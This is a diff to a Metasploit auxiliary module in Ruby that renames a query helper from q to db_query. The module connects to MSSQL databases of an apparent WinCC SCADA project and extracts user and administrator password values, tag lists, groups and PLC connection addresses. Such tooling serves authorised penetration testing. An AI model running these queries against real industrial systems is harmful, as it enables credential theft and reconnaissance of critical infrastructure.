@@ -67,14 +67,14 @@ class Metasploit3 < Msf::Auxiliary
 		# try connect to DB
 		if mssql_login_datastore
 			# get db
-			project_databases_names = q("SELECT name FROM master..sysdatabases WHERE name LIKE 'CC%_[0-9]'")
+			project_databases_names = db_query("SELECT name FROM master..sysdatabases WHERE name LIKE 'CC%_[0-9]'")
 			get_info(project_databases_names)
 		else
 			print_error "Can't connect to the database"
 		end
 	end
 
-	def q(query, verbose = false, only_rows = true)
+	def db_query(query, verbose = false, only_rows = true)
 		# query MSSQL DB
 		result = mssql_query(query, verbose)
 		if !result[:errors].empty?
@@ -107,9 +107,9 @@ class Metasploit3 < Msf::Auxiliary
 			# get db name
 			db = db.first
 			prj[db] = {}
-			prj[db]["name"] = q("SELECT DSN FROM #{db}.dbo.CC_CsSysInfoLog")
+			prj[db]["name"] = db_query("SELECT DSN FROM #{db}.dbo.CC_CsSysInfoLog")
 
-			prj[db]["admins"] = q("SELECT NAME,
+			prj[db]["admins"] = db_query("SELECT NAME,
 				convert(varbinary, PASS) as PWD
 				FROM #{db}.dbo.PW_USER
 				WHERE PASS <> '' and GRPID = 1000")
@@ -120,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
 				usr.insert(2,usr_pass)
 			end
 
-			prj[db]["users"] = q("SELECT ID, NAME, convert(varbinary, PASS), GRPID
+			prj[db]["users"] = db_query("SELECT ID, NAME, convert(varbinary, PASS), GRPID
 				FROM #{db}.[dbo].[PW_USER]
 				WHERE PASS <> '' and GRPID <> 1000")
 
@@ -130,10 +130,10 @@ class Metasploit3 < Msf::Auxiliary
 				usr.insert(3,usr_pass)
 			end
 
-			prj[db]["tags"] = q("SELECT VARNAME,VARTYP,COMMENTS FROM #{db}.[dbo].[PDE#TAGs]")
-			prj[db]["groups"] = q("SELECT ID, NAME FROM #{db}.[dbo].[PW_USER] WHERE PASS = ''")
+			prj[db]["tags"] = db_query("SELECT VARNAME,VARTYP,COMMENTS FROM #{db}.[dbo].[PDE#TAGs]")
+			prj[db]["groups"] = db_query("SELECT ID, NAME FROM #{db}.[dbo].[PW_USER] WHERE PASS = ''")
 
-			prj[db]["plcs"] = q("SELECT CONNECTIONNAME, PARAMETER FROM #{db}.[dbo].[MCPTCONNECTION]")
+			prj[db]["plcs"] = db_query("SELECT CONNECTIONNAME, PARAMETER FROM #{db}.[dbo].[MCPTCONNECTION]")
 
 			# get PLC IP
 			prj[db]["plcs"] = prj[db]["plcs"].map do |name, ip|
